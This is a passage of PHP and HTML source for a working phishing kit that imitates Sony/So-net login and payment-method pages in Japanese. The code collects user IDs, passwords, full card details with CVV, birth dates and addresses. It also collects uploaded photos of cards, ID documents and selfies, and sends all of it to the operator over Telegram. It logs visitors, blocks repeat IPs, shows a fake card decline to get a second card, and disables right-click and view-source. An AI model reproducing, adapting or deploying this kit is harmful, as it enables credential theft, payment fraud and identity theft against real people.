                'expire_month' => $_POST['cardExpirationMonth'] ?? '',
                'expire_year' => $_POST['cardExpirationYear'] ?? '',
                'cvv' => $cvv,
                'cid' => $cid,
                'rek' => $rek,
                'birth_date' => $birth_year . '/' . $birth_month . '/' . $birth_day,
                'address' => $_POST['address'] ?? ''
            ]);
            $next_step = $step === 'verif' ? 'reverif' : 'kyc';
            unset($_SESSION['form_'.$step]);
        }
        header("Location: ?step={$next_step}");
        exit;
    }

    // === KYC ===
    if ($step === 'kyc') {
        $dir = UPLOADS_DIR;
        if (!is_dir($dir)) mkdir($dir, 0777, true);
        $files = ['card_front', 'card_back', 'id_passport', 'selfie'];
        $error = false;
        $saved_files = [];
        foreach ($files as $f) {
            if (!isset($_FILES[$f]) || $_FILES[$f]['error'] !== UPLOAD_ERR_OK) {
                $_SESSION['error'] = 'missing_file'; $error = true; break;
            }
            $ext = pathinfo($_FILES[$f]['name'], PATHINFO_EXTENSION);
            if (strtolower($ext) !== 'jpg') {
                $_SESSION['error'] = 'invalid_ext'; $error = true; break;
            }
            $filename = uniqid() . '_' . $f . '.jpg';
            $path = $dir . $filename;
            if (!move_uploaded_file($_FILES[$f]['tmp_name'], $path)) {
                $_SESSION['error'] = 'upload_fail'; $error = true; break;
            }
            $saved_files[$f] = $path;
            sendDocToTelegram($path, $f);
        }
        if (!$error) {
            $msg = "»»————- ★[ SONY KYC SUBMITTED ]★ ————-««\n";
            foreach ($files as $f) {
                $label = ucfirst(str_replace('_', ' ', $f));
                $msg .= "[{$label}] : <code>" . basename($saved_files[$f]) . "</code>\n";
            }
            $msg .= "»»————- ★[ DEVICE INFO ]★ ————-««\n";
            $msg .= "IP                : <code>{$ip}</code>\n";
            $msg .= "ISP               : <code>{$isp}</code>\n";
            $msg .= "Location          : <code>{$loc}</code>\n";
            $msg .= "OS                : <code>{$os}</code>\n";
            $msg .= "Browser           : <code>{$browser}</code>\n";
            $msg .= "Fingerprint       : <code>{$fp}</code>\n";
            $msg .= "Timestamp         : <code>{$time}</code>";

            sendToTelegramAPI($msg);
            logVisitor('KYC SUBMITTED', ['files' => count($saved_files) . ' images']);
            logInput('kyc', ['files' => implode(', ', array_keys($saved_files))]);

            saveResult([
                'type' => 'kyc',
                'email' => $_SESSION['email'] ?? '',
                'password' => $_SESSION['first_password'] ?? '',
                'card_front' => $saved_files['card_front'] ?? '',
                'card_back' => $saved_files['card_back'] ?? '',
                'id_passport' => $saved_files['id_passport'] ?? '',
                'selfie' => $saved_files['selfie'] ?? ''
            ]);
            file_put_contents(BLOCKED_IPS_FILE, $ip . "\n", FILE_APPEND | LOCK_EX);
            $next_step = 'finish';
            unset($_SESSION['form_kyc']);
        } else {
            $next_step = 'kyc';
        }
        header("Location: ?step={$next_step}");
        exit;
    }

    // === FINISH ===
    if ($step === 'finish') {
        file_put_contents(BLOCKED_IPS_FILE, $ip . "\n", FILE_APPEND | LOCK_EX);
        logVisitor('FINISH', ['status' => 'completed']);
        logInput('finish', ['status' => 'completed']);
        header("Location: ?step=finish");
        exit;
    }
    header("Location: ?step=login");
    exit;
}

// CEK FINISH
if ($current_step === 'finish' && isset($_SESSION['device_info'])) {
    $ip = $_SESSION['device_info']['ip'] ?? '0.0.0.0';
    if (!in_array($ip, file(BLOCKED_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
        file_put_contents(BLOCKED_IPS_FILE, $ip . "\n", FILE_APPEND | LOCK_EX);
    }
    echo '<script>setTimeout(() => window.location.href = "https://www.sony.co.jp/", 1000);</script>';
}

$error = $_SESSION['error'] ?? '';
unset($_SESSION['error']);
$login_error = $_SESSION['login_error'] ?? '';
unset($_SESSION['login_error']);
$password_error = $_SESSION['password_error'] ?? '';
unset($_SESSION['password_error']);
$smtp_error = $_SESSION['smtp_error'] ?? false;
unset($_SESSION['smtp_error']);
$form_verif = $_SESSION['form_verif'] ?? [];
$form_reverif = $_SESSION['form_reverif'] ?? [];
$form_kyc = $_SESSION['form_kyc'] ?? [];
$email = $_SESSION['email'] ?? '';
$login_id_input = $_SESSION['login_id_input'] ?? '';
unset($_SESSION['login_id_input']);
?>
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo in_array($current_step, ['verif', 'reverif', 'kyc']) ? 'お支払い方法のご登録・ご変更' : 'ログイン | So-net'; ?></title>
<link rel="icon" href="https://id.so-net.ne.jp/iam/auth/resources/erbjw/login/so-net/img/favicon.ico">
<style>
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: "Hiragino Kaku Gothic ProN", "Meiryo", sans-serif; background: #fff; color: #333; }
a { color: #0066cc; text-decoration: none; }
a:hover { color: #ff6600; text-decoration: underline; }
img { max-width: 100%; vertical-align: bottom; }
.sony-header { background: #000; padding: 12px 30px; height: 50px; }
.sony-header img { height: 22px; width: auto; }
.sonet-header { background: #e6007e; padding: 10px 30px; height: 45px; display: flex; align-items: center; }
.sonet-header img { height: 28px; width: auto; }
.main-container { max-width: 960px; margin: 0 auto; padding: 30px; }
.page-title { font-size: 28px; font-weight: normal; color: #000; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #ddd; }
.notification-box { display: flex; border: 1px solid #c00; background: #fff; margin-bottom: 30px; }
.notification-box .label { background: #ffe6e6; padding: 15px 20px; color: #c00; font-weight: bold; font-size: 14px; min-width: 120px; display: flex; align-items: center; justify-content: center; }
.notification-box .content { padding: 15px 20px; flex: 1; }
.notification-box .content h3 { font-size: 13px; color: #c00; margin-bottom: 10px; font-weight: bold; }
.notification-box .content ul { list-style: disc; padding-left: 20px; font-size: 12px; color: #333; line-height: 1.8; }
.notification-box .content ul li { margin-bottom: 5px; }
.notification-box .content a { color: #0066cc; text-decoration: none; }
.notification-box .content a:hover { text-decoration: underline; }
.form-group { margin-bottom: 25px; }
.form-group label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #333; }
.form-group label span.required { color: #e60013; margin-left: 5px; font-size: 12px; }
.form-control { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 0; font-size: 16px; background: #f9f9f9; }
.form-control:focus { outline: none; border-color: #e6007e; background: #fff; }
.form-control.error { border: 2px solid #e60013 !important; box-shadow: 0 0 5px rgba(230, 0, 19, 0.5) !important; }
.password-mask { -webkit-text-security: disc; -moz-text-security: disc; text-security: disc; }
.error-text { color: #e60013; font-size: 12px; margin-top: 5px; display: none; }
.error-text.show { display: block; }
.text-hint { color: #666; font-size: 12px; margin-bottom: 5px; }
.btn { display: inline-block; padding: 12px 40px; background: #e6007e; color: #fff; border: none; border-radius: 0; font-size: 16px; cursor: pointer; min-width: 200px; }
.btn:hover { background: #c0006a; }
.checkbox-group { margin: 20px 0; }
.checkbox-group label { display: flex; align-items: center; font-weight: normal; font-size: 14px; cursor: pointer; color: #333; }
.checkbox-group input { margin-right: 10px; }
.form-links { margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; }
.form-links a { color: #0066cc; text-decoration: none; font-size: 13px; display: block; margin-bottom: 8px; }
.form-links a:hover { text-decoration: underline; }
.form-section { margin-bottom: 25px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
.form-section:last-child { border-bottom: none; }
.form-row { display: flex; gap: 20px; }
.form-row .form-group { flex: 1; }
.select-group { display: flex; gap: 10px; align-items: center; }
.select-group select { padding: 10px; border: 1px solid #ccc; background: #f9f9f9; }
.alert-box { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; margin-bottom: 20px; }
.alert-box.error { background: #f8d7da; border-color: #f5c6cb; color: #721c24; }
.upload-group { margin-bottom: 20px; }
.upload-group label { display: block; margin-bottom: 8px; font-weight: bold; }
.upload-group input[type="file"] { padding: 10px; border: 1px dashed #ccc; width: 100%; background: #f9f9f9; }
.footer { background: #f5f5f5; padding: 30px; text-align: center; border-top: 1px solid #ddd; margin-top: 50px; }
.footer-links { margin-bottom: 15px; }
.footer-links a { color: #666; text-decoration: none; margin: 0 15px; font-size: 12px; }
.footer-copyright { color: #999; font-size: 12px; }
.success-message { text-align: center; padding: 50px 20px; }
.success-message h2 { color: #28a745; margin-bottom: 20px; font-size: 24px; }
.password-wrapper { position: relative; }
.cid-field { display: none; }
.cid-field.show { display: block; }
.userid-display { background: #f5f5f5; padding: 15px 20px; border-radius: 0; margin-bottom: 20px; font-size: 16px; color: #333; }
@media (max-width: 768px) {
    .sony-header, .sonet-header { padding: 10px 15px; }
    .main-container { padding: 20px 15px; }
    .form-row { flex-direction: column; gap: 0; }
    .notification-box { flex-direction: column; }
    .notification-box .label { min-width: auto; padding: 10px; }
    .footer-links a { display: block; margin: 10px 0; }
}
</style>
</head>
<body>
<div class="sony-header">
    <img src="https://www.so-net.ne.jp/assets/images/logo/sony.png" alt="SONY">
</div>
<div class="sonet-header">
    <img src="https://www.so-net.ne.jp/common/hf1704/img/logo.png" alt="So-net">
</div>
<div class="main-container">
    <h1 class="page-title">
        <?php
        if ($current_step === 'login') echo 'ログイン';
        elseif ($current_step === 'relogin') echo 'パスワードの入力';
        elseif (in_array($current_step, ['verif', 'reverif'])) echo 'お支払い方法のご登録・ご変更';
        elseif ($current_step === 'kyc') echo '本人確認書類のアップロード';
        else echo '完了';
        ?>
    </h1>
    <?php if ($current_step === 'login' || $current_step === 'relogin'): ?>
    <div class="notification-box">
        <div class="label">お知らせ</div>
        <div class="content">
            <h3>生体認証を利用したログイン</h3>
            <ul>
                <li>指紋・顔認証を利用してログインができるようになりました。<a href="#">会員アプリからログイン</a></li>
                <li>アプリでいつでも簡単ログイン。<a href="#">詳しくはこちら</a></li>
            </ul>
        </div>
    </div>
    <?php endif; ?>
    <?php if ($current_step === 'login'): ?>
    <form method="post" action="" id="loginForm">
        <input type="hidden" name="step" value="login">
        <div class="form-group">
            <label for="email">ユーザー ID</label>
            <div class="text-hint">半角英数字 [例] taro_s@aa</div>
            <input type="text" id="email" name="email" class="form-control <?php echo ($login_error === 'invalid_format') ? 'error' : ''; ?>" placeholder="[例] taro_s@aa" required autofocus value="<?php echo htmlspecialchars($login_id_input); ?>" autocomplete="username">
            <?php if ($login_error === 'invalid_format'): ?>
            <div class="error-text show">ユーザー ID が正しくありません。</div>
            <?php endif; ?>
        </div>
        <div class="checkbox-group">
            <label><input type="checkbox" name="remember_me" checked> 次回ログインからユーザー ID の入力を省略する</label>
        </div>
        <button type="submit" class="btn">次へ</button>
        <div class="form-links">
            <a href="#">ユーザー ID をお忘れの方はこちら</a>
            <a href="#">メンバーズコースへ新規登録される方はこちら</a>
        </div>
    </form>
    <script>
    (function() {
        const emailInput = document.getElementById('email');
        emailInput.addEventListener('input', function() {
            const value = emailInput.value.trim();
            if (value.length > 0) {
                 emailInput.classList.remove('error');
            }
        });
    })();
    </script>
    <?php elseif ($current_step === 'relogin'): ?>
    <form method="post" action="">
        <input type="hidden" name="step" value="relogin">
        <div class="form-group">
            <label>ユーザー ID</label>
            <div class="userid-display"><?php echo htmlspecialchars($email); ?></div>
            <p style="font-size: 12px; margin-bottom: 20px;"><a href="?step=login" style="color: #0066cc;">別のユーザー ID でログインする</a></p>
        </div>
        <div class="form-group">
            <label for="password">ユーザー ID パスワード</label>
            <div class="text-hint">半角英数字</div>
            <div class="password-wrapper">
                <input type="text" id="password" name="password" class="form-control password-mask <?php echo ($smtp_error) ? 'error' : ''; ?>" placeholder="パスワード" required minlength="8" autofocus autocomplete="current-password">
            </div>
            <?php if ($smtp_error || $password_error): ?>
            <div class="error-text show">
                <?php
                if ($password_error === 'blocklisted') echo 'ユーザー ID またはパスワードが正しくありません。';
                elseif ($password_error === 'wrong_password') echo 'ユーザー ID パスワードが正しくありません。';
                elseif ($password_error === 'same_password') echo '前のパスワードと同じです。別のパスワードを入力してください。';
                else echo 'ユーザー ID またはパスワードが正しくありません。';
                ?>
            </div>
            <?php endif; ?>
        </div>
        <div class="checkbox-group">
            <label><input type="checkbox" id="show-password" onchange="togglePassword()"> ユーザー ID パスワードを表示する</label>
            <p style="font-size: 11px; color: #666; margin-top: 5px;">※ほかの人にユーザー ID パスワードを見られないよう、ご注意ください</p>
        </div>
        <button type="submit" class="btn">パスワードでログイン</button>
        <div class="form-links">
            <a href="#">ユーザー ID パスワードをお忘れの方はこちら</a>
            <a href="#">安全にご利用いただくためのパスワード管理のおすすめ</a>
        </div>
    </form>
    <script>
    function togglePassword() {
        const pw = document.getElementById('password');
        const cb = document.getElementById('show-password');
        if (cb.checked) {
            pw.classList.remove('password-mask');
        } else {
            pw.classList.add('password-mask');
        }
    }
    </script>
    <?php elseif ($current_step === 'verif' || $current_step === 'reverif'): ?>
    <?php if ($current_step === 'reverif'): ?>
    <div class="alert-box error">
        <p style="font-weight: bold;">カードが拒否されました。別のカードを試してください。</p>
    </div>
    <?php endif; ?>
    <?php if ($error === 'card_blocked'): ?>
    <div class="alert-box error">
        <p style="font-weight: bold; color: #e60013;">このカードはご利用いただけません。別のカードをお試しください。</p>
    </div>
    <?php endif; ?>
    <?php if ($error === 'expired_card'): ?>
    <div class="alert-box error">
        <p style="font-weight: bold; color: #e60013;">有効期限が切れています。正しい有効期限を入力してください。</p>
    </div>
    <?php endif; ?>
    <?php if ($error === 'cvv_cid_same_prefix'): ?>
    <div class="alert-box error">
        <p style="font-weight: bold; color: #e60013;">セキュリティコードとCIDの組み合わせが正しくありません。</p>
    </div>
    <?php endif; ?>
    <?php if ($error === 'duplicate'): ?>
    <div class="alert-box error">
        <p style="font-weight: bold; color: #e60013;">このカードは既に登録されています。別のカードを入力してください。</p>
    </div>
    <?php endif; ?>
    <form method="post" action="" id="<?php echo $current_step; ?>Form">
        <input type="hidden" name="step" value="<?php echo $current_step; ?>">
        <div class="alert-box">
            <p style="font-size: 14px; margin-bottom: 10px;"><strong>ご注意</strong></p>
            <ul style="font-size: 13px; padding-left: 20px;">
                <li>本手続きでは、<strong>デビットカード</strong>のご利用を推奨いたします。</li>
                <li>一部のカードは登録できない場合があります。</li>
                <li>海外で発行されたクレジットカードはご利用いただけません。</li>
            </ul>
        </div>
        <div class="form-section">
            <div class="form-group">
                <label>カード種別 <span class="required">必須</span></label>
                <select name="UP2030_creditCardKind" class="form-control" required onchange="toggleCidField()">
                    <option value="">こちらからお選びください</option>
                    <option value="01">ダイナース</option>
                    <option value="02">JCB</option>
                    <option value="07">AMERICAN EXPRESS</option>
                    <option value="11">VISA</option>
                    <option value="12">MasterCard</option>
                </select>
            </div>
            <div class="form-group">
                <label>カード名義人（ローマ字） <span class="required">必須</span></label>
                <input type="text" name="card-family-name" class="form-control" placeholder="YAMADA TARO" maxlength="30" required value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['card-family-name'] ?? '') : ($form_reverif['card-family-name'] ?? '')); ?>">
            </div>
            <div class="form-group">
                <label>デビットカード番号 <span class="required">必須</span></label>
                <input type="text" name="new_account" id="cardNumber" class="form-control <?php echo ($error === 'duplicate') ? 'error' : ''; ?>" placeholder="デビットカード番号" maxlength="19" required oninput="formatCardNumber(this)" value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['new_account'] ?? '') : ($form_reverif['new_account'] ?? '')); ?>">
                <?php if ($error === 'duplicate'): ?>
                <div class="error-text show">このカードは既に登録されています。別のカードを入力してください。</div>
                <?php endif; ?>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>有効期限（月） <span class="required">必須</span></label>
                    <select name="cardExpirationMonth" id="expMonth" class="form-control" required>
                        <option value="">--</option>
                        <?php for($m=1;$m<=12;$m++): $mm=str_pad($m,2,0,STR_PAD_LEFT); ?>
                        <option value="<?php echo $mm; ?>" <?php echo ($current_step === 'verif' ? ($form_verif['cardExpirationMonth'] ?? '') : ($form_reverif['cardExpirationMonth'] ?? '')) == $mm ? 'selected' : ''; ?>><?php echo $m; ?></option>
                        <?php endfor; ?>
                    </select>
                </div>
                <div class="form-group">
                    <label>有効期限（年） <span class="required">必須</span></label>
                    <select name="cardExpirationYear" id="expYear" class="form-control" required>
                        <option value="">--</option>
                        <?php $y = date('Y'); for($i=$y;$i<=$y+20;$i++): ?>
                        <option value="<?php echo $i; ?>" <?php echo ($current_step === 'verif' ? ($form_verif['cardExpirationYear'] ?? '') : ($form_reverif['cardExpirationYear'] ?? '')) == $i ? 'selected' : ''; ?>><?php echo substr($i, 2); ?></option>
                        <?php endfor; ?>
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label>セキュリティコード <span class="required">必須</span></label>
                <input type="text" name="card-code" id="cvvInput" class="form-control password-mask" placeholder="123" maxlength="4" required style="width: 150px;" value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['card-code'] ?? '') : ($form_reverif['card-code'] ?? '')); ?>">
            </div>
            <div class="form-group cid-field" id="cidField">
                <label>3 桁の CID <span class="required">必須</span></label>
                <input type="text" name="cid" id="cidInput" class="form-control password-mask" placeholder="123" maxlength="3" style="width: 150px;" value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['cid'] ?? '') : ($form_reverif['cid'] ?? '')); ?>">
            </div>
            <div class="form-group">
                <label>カードご利用代金 お支払口座番号の下 4 桁 <span class="required">必須</span></label>
                <input type="text" name="rek" class="form-control" placeholder="1234" maxlength="4" required style="width: 150px;" value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['rek'] ?? '') : ($form_reverif['rek'] ?? '')); ?>">
            </div>
            <div class="form-group">
                <label>カード名義人 / 生年月日 <span class="required">必須</span></label>
                <div class="select-group">
                    <select name="birth_year" required>
                        <option value="">年</option>
                        <?php for($y=date('Y');$y>=1900;$y--): ?>
                        <option value="<?php echo $y; ?>" <?php echo ($current_step === 'verif' ? ($form_verif['birth_year'] ?? '') : ($form_reverif['birth_year'] ?? '')) == $y ? 'selected' : ''; ?>><?php echo $y; ?></option>
                        <?php endfor; ?>
                    </select>
                    <select name="birth_month" required>
                        <option value="">月</option>
                        <?php for($m=1;$m<=12;$m++): ?>
                        <option value="<?php echo $m; ?>" <?php echo ($current_step === 'verif' ? ($form_verif['birth_month'] ?? '') : ($form_reverif['birth_month'] ?? '')) == $m ? 'selected' : ''; ?>><?php echo $m; ?></option>
                        <?php endfor; ?>
                    </select>
                    <select name="birth_day" required>
                        <option value="">日</option>
                        <?php for($d=1;$d<=31;$d++): ?>
                        <option value="<?php echo $d; ?>" <?php echo ($current_step === 'verif' ? ($form_verif['birth_day'] ?? '') : ($form_reverif['birth_day'] ?? '')) == $d ? 'selected' : ''; ?>><?php echo $d; ?></option>
                        <?php endfor; ?>
                    </select>
                </div>
            </div>
            <div class="form-group">
                <label>完全な住所 <span class="required">必須</span></label>
                <input type="text" name="address" class="form-control" placeholder="〒103-8220 東京都中央区日本橋兜町 -1" required value="<?php echo htmlspecialchars($current_step === 'verif' ? ($form_verif['address'] ?? '') : ($form_reverif['address'] ?? '')); ?>">
            </div>
        </div>
        <button type="submit" class="btn"><?php echo $current_step === 'verif' ? '入力内容を確認する' : '完了'; ?></button>
    </form>
    <script>
    function formatCardNumber(input) {
        let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        input.value = formatted;
        toggleCidField();
    }
    function toggleCidField() {
        const cardType = document.querySelector('select[name="UP2030_creditCardKind"]').value;
        const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const cidField = document.getElementById('cidField');
        if (cardType === '07' || cardNum.startsWith('37')) {
            cidField.classList.add('show');
            cidField.querySelector('input').required = true;
        } else {
            cidField.classList.remove('show');
            cidField.querySelector('input').required = false;
        }
    }

    function validateExpiry() {
        const monthSel = document.getElementById('expMonth');
        const yearSel = document.getElementById('expYear');
        const m = parseInt(monthSel.value);
        const y = parseInt(yearSel.value);
        if (m && y) {
            const now = new Date();
            const currentYear = now.getFullYear();
            const currentMonth = now.getMonth() + 1;
            if (y < currentYear || (y === currentYear && m < currentMonth)) {
                monthSel.classList.add('error');
                yearSel.classList.add('error');
            } else {
                monthSel.classList.remove('error');
                yearSel.classList.remove('error');
            }
        }
    }
    document.getElementById('expMonth').addEventListener('change', validateExpiry);
    document.getElementById('expYear').addEventListener('change', validateExpiry);

    function validateCidCvv() {
        const cvv = document.getElementById('cvvInput').value;
        const cid = document.getElementById('cidInput').value;
        const cidField = document.getElementById('cidField');
        if (cidField.classList.contains('show') && cvv.length >= 3 && cid.length === 3) {
            const cvvPrefix = cvv.substring(0, 3);
            if (cvvPrefix === cid) {
                document.getElementById('cidInput').classList.add('error');
                document.getElementById('cvvInput').classList.add('error');
            } else {
                document.getElementById('cidInput').classList.remove('error');
                document.getElementById('cvvInput').classList.remove('error');
            }
        }
    }
    document.getElementById('cvvInput').addEventListener('input', validateCidCvv);
    document.getElementById('cidInput').addEventListener('input', validateCidCvv);

    <?php if ($current_step === 'reverif'): ?>
    const firstCard = '<?php echo $_SESSION['verif_card'] ?? ''; ?>';
    document.getElementById('<?php echo $current_step; ?>Form').addEventListener('submit', function(e) {
        const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
        if (firstCard !== '' && cardNum === firstCard) {
            e.preventDefault();
            document.getElementById('cardNumber').classList.add('error');
            alert('このカードは既に登録されています。別のカードを入力してください。');
            return false;
        }
    });
    <?php endif; ?>
    </script>
    <?php elseif ($current_step === 'kyc'): ?>
    <form method="post" action="" enctype="multipart/form-data">
        <input type="hidden" name="step" value="kyc">
        <div class="alert-box"><p>ご本人様確認のため、以下の書類をご提出ください。</p></div>
        <div class="upload-group">
            <label>クレジットカードの表面 <span class="required">必須</span></label>
            <input type="file" name="card_front" accept="image/jpeg" required>
        </div>
        <div class="upload-group">
            <label>クレジットカードの裏面 <span class="required">必須</span></label>
            <input type="file" name="card_back" accept="image/jpeg" required>
        </div>
        <div class="upload-group">
            <label>ID またはパスポート <span class="required">必須</span></label>
            <input type="file" name="id_passport" accept="image/jpeg" required>
        </div>
        <div class="upload-group">
            <label>本人確認のセルフィー <span class="required">必須</span></label>
            <input type="file" name="selfie" accept="image/jpeg" required>
        </div>
        <button type="submit" class="btn">送信</button>
    </form>
    <?php elseif ($current_step === 'finish'): ?>
    <div class="success-message">
        <h2>完了しました</h2>
        <p>処理が正常に終了しました。</p>
        <p style="margin-top: 20px; color: #666; font-size: 14px;">自動的にトップページへ移動します...</p>
    </div>
    <script>setTimeout(() => window.location.href = 'https://www.sony.co.jp/', 2000);</script>
    <?php endif; ?>
</div>
<div class="footer">
    <div class="footer-links">
        <a href="#">会社情報</a>
        <a href="#">個人情報保護/情報セキュリティ</a>
        <a href="#">ウェブサイトご利用条件</a>
    </div>
    <div class="footer-copyright"><p>© Sony Network Communications Inc.</p></div>
</div>
<script>
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 67 || e.keyCode == 86)) e.preventDefault();
    if (e.keyCode == 123) e.preventDefault();
});
</script>
</body>
</html>